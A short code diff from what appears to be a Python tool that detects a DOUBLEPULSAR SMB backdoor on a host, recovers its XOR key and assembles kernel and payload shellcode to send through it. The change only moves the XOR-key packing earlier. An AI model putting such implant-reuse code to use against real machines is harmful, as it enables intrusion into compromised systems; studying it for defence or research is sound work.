@@ -182,6 +182,10 @@ if __name__ == "__main__":
         arch = calculate_doublepulsar_arch(signature_long)
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
         
+        xor_key = key #hex(key) 
+        packed_xor_key = struct.pack('<I', xor_key)
+        #print(packed_xor_key)
+
         #generate the final payload shellcode first
         modified_kernel_shellcode = bytearray(kernel_shellcode)
         bytes_payload_shellcode = bytearray(payload_shellcode)
@@ -216,9 +220,6 @@ if __name__ == "__main__":
         
         #build the doublepulsar parameters
         EntireShellcodeSize = len(modified_kernel_shellcode)
-        xor_key = key #hex(key) 
-        packed_xor_key = struct.pack('<I', xor_key)
-        #print(packed_xor_key)
         print("Generating the parameters...")
         parameters = b''
         '''
